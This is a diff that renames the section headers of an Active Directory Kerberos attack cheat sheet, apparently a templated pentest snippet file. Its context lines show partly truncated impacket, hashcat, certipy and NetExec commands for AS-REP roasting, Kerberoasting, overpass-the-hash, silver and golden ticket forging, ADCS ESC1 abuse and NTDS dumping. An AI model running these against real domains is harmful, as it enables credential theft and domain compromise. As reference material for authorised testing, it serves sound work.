@@ -6,7 +6,7 @@
 
 ---
 
-## Kerberos - Sync Time to DC (Required)
+## sync time to DC
 Kerberos rejects skew >5min. Sync first.
 
 ```bash
@@ -17,7 +17,7 @@ sudo ntpdate -s {{DC_IP:ip:10.10.10.1}} || sudo rdate -n {{DC_IP:ip:10.10.10.1}}
 
 ---
 
-## Kerberos - Add DC to /etc/hosts
+## add DC to hosts file
 Resolve DC FQDN locally.
 
 ```bash
@@ -28,7 +28,7 @@ echo "{{DC_IP:ip:10.10.10.1}} {{DC_HOST:str:dc01.corp.local}} {{DOMAIN:domain:co
 
 ---
 
-## Kerberos - Generate krb5.conf
+## generate krb5.conf
 Minimal krb5.conf for impacket/winrmexec.
 
 ```bash
@@ -52,7 +52,7 @@ EOF
 
 ---
 
-## Kerberos - ASREP Roast (No Auth)
+## asreproast unauthenticated
 Find users with PreAuth disabled and request AS-REP.
 
 ```bash
@@ -63,7 +63,7 @@ impacket-GetNPUsers {{DOMAIN:domain:corp.local}}/ -dc-ip {{DC_IP:ip:10.10.10.1}}
 
 ---
 
-## Kerberos - ASREP Roast (Authenticated)
+## asreproast authenticated
 Use existing creds to find ASREProast targets.
 
 ```bash
@@ -74,7 +74,7 @@ impacket-GetNPUsers {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWOR
 
 ---
 
-## Kerberos - Crack ASREP (hashcat)
+## crack asrep hashcat
 Crack AS-REP hash with mode 18200.
 
 ```bash
@@ -85,7 +85,7 @@ hashcat -m 18200 asrep_hashes.txt {{WORDLIST:wordlist:/usr/share/wordlists/rocky
 
 ---
 
-## Kerberos - Kerberoast (Find SPNs)
+## kerberoast find SPNs
 List Kerberoastable service accounts.
 
 ```bash
@@ -96,7 +96,7 @@ impacket-GetUserSPNs {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWO
 
 ---
 
-## Kerberos - Kerberoast (Request TGS-REPs)
+## kerberoast request TGS hashes
 Pull crackable TGS-REPs.
 
 ```bash
@@ -107,7 +107,7 @@ impacket-GetUserSPNs {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWO
 
 ---
 
-## Kerberos - Kerberoast via Kerberos Auth
+## kerberoast via ticket auth
 Avoid plaintext password by using TGT.
 
 ```bash
@@ -118,7 +118,7 @@ KRB5CCNAME={{USERNAME:str:user}}.ccache impacket-GetUserSPNs '{{DOMAIN:domain:co
 
 ---
 
-## Kerberos - Crack TGS (hashcat)
+## crack TGS hashcat
 Crack TGS-REP with mode 13100.
 
 ```bash
@@ -129,7 +129,7 @@ hashcat -m 13100 tgs_hashes.txt {{WORDLIST:wordlist:/usr/share/wordlists/rockyou
 
 ---
 
-## Kerberos - Get TGT (Password)
+## get TGT with password
 Request a TGT and save ccache.
 
 ```bash
@@ -140,7 +140,7 @@ impacket-getTGT {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:st
 
 ---
 
-## Kerberos - Get TGT (NT Hash)
+## get TGT overpass-the-hash
 Request TGT using NT hash (overpass-the-hash).
 
 ```bash
@@ -151,7 +151,7 @@ impacket-getTGT -hashes :{{NTHASH:str:31d6cfe0d16ae931b73c59d7e0c089c0}} '{{DOMA
 
 ---
 
-## Kerberos - Get TGT for Computer
+## get TGT computer account
 Computer accounts use $ suffix.
 
 ```bash
@@ -162,7 +162,7 @@ impacket-getTGT -hashes :{{NTHASH:str:e19ccf75ee54e06b06a5907af13cef42}} '{{DOMA
 
 ---
 
-## Kerberos - Use ccache (export)
+## export ccache env
 Set env to use cached ticket.
 
 ```bash
@@ -173,7 +173,7 @@ export KRB5CCNAME={{CCACHE:file:user.ccache}}
 
 ---
 
-## Kerberos - Inspect ccache
+## inspect ccache ticket
 Show contents of ticket cache.
 
 ```bash
@@ -185,7 +185,7 @@ impacket-describeTicket {{CCACHE:file:user.ccache}}
 
 ---
 
-## Kerberos - Convert kirbi <-> ccache
+## convert kirbi ccache
 Translate between Windows/Linux formats.
 
 ```bash
@@ -197,7 +197,7 @@ impacket-ticketConverter {{CCACHE:file:dc01.ccache}} {{KIRBI:file:dc01.kirbi}}
 
 ---
 
-## Kerberos - Get Service Ticket (impacket-getST)
+## get service ticket TGS
 Request a TGS for a specific service.
 
 ```bash
@@ -208,7 +208,7 @@ impacket-getST -spn '{{SPN:str:cifs/dc01.corp.local}}' '{{DOMAIN:domain:corp.loc
 
 ---
 
-## Kerberos - S4U2Self (Constrained Delegation)
+## s4u2self constrained delegation
 Impersonate user via S4U2Self.
 
 ```bash
@@ -219,7 +219,7 @@ impacket-getST -impersonate '{{IMPERSONATE:str:Administrator}}' -spn '{{SPN:str:
 
 ---
 
-## Kerberos - U2U (User-to-User)
+## u2u user-to-user ticket
 Request U2U TGS for self-authentication scenarios.
 
 ```bash
@@ -230,7 +230,7 @@ KRB5CCNAME={{COMP:str:web01}}$.ccache impacket-getST -u2u -impersonate 'Administ
 
 ---
 
-## Kerberos - Use Ticket (smbclient)
+## use ticket smbclient
 Authenticate to SMB using ccache.
 
 ```bash
@@ -241,7 +241,7 @@ KRB5CCNAME={{CCACHE:file:user.ccache}} impacket-smbclient -k -no-pass {{DC_HOST:
 
 ---
 
-## Kerberos - Use Ticket (mssqlclient)
+## use ticket mssql
 MSSQL with Kerberos integrated auth.
 
 ```bash
@@ -252,7 +252,7 @@ KRB5CCNAME={{CCACHE:file:user.ccache}} impacket-mssqlclient -k -no-pass {{DC_HOS
 
 ---
 
-## Kerberos - Use Ticket (evil-winrm)
+## use ticket winrm
 Evil-WinRM with Kerberos.
 
 ```bash
@@ -263,7 +263,7 @@ KRB5_CONFIG=/tmp/krb5.conf KRB5CCNAME={{CCACHE:file:user.ccache}} evil-winrm -i 
 
 ---
 
-## Kerberos - Silver Ticket
+## forge silver ticket
 Forge service ticket via service account NT hash.
 
 ```bash
@@ -274,7 +274,7 @@ impacket-ticketer -nthash {{SVC_NT:str:ef699384c3285c54128a3ee1ddb1a0cc}} -domai
 
 ---
 
-## Kerberos - Golden Ticket
+## forge golden ticket
 Forge TGT using krbtgt NT hash.
 
 ```bash
@@ -285,7 +285,7 @@ impacket-ticketer -nthash {{KRBTGT_NT:str:abc123...}} -domain-sid {{SID:str:S-1-
 
 ---
 
-## Kerberos - SMB with ccache (NetExec --use-kcache)
+## dump ntds with ccache
 Use Linux kerb cache with NetExec.
 
 ```bash
@@ -296,7 +296,7 @@ KRB5CCNAME={{CCACHE:file:user.ccache}} nxc smb {{DC_HOST:str:dc01.corp.local}} -
 
 ---
 
-## Kerberos - WinRMexec (SPN-specified)
+## winrm exec ticket SPN
 Use winrmexec with specific SPN.
 
 ```bash
@@ -307,7 +307,7 @@ KRB5_CONFIG=/tmp/krb5.conf KRB5CCNAME={{CCACHE:file:user.ccache}} python3 winrme
 
 ---
 
-## Kerberos - certipy ESC1 (ADCS)
+## esc1 request cert adcs
 Request cert with SAN to impersonate.
 
 ```bash
@@ -318,7 +318,7 @@ certipy req -u '{{USERNAME:str:user}}@{{DOMAIN:domain:corp.local}}' -p '{{PASSWO
 
 ---
 
-## Kerberos - certipy auth (cert -> TGT)
+## auth cert to TGT adcs
 Convert cert to TGT.
 
 ```bash
@@ -329,7 +329,7 @@ certipy auth -pfx {{PFX:file:user.pfx}} -dc-ip {{DC_IP:ip:10.10.10.1}}
 
 ---
 
-## Kerberos - PassTheCert
+## pass-the-cert ldap auth
 Authenticate to LDAP/HTTPS with cert.
 
 ```bash
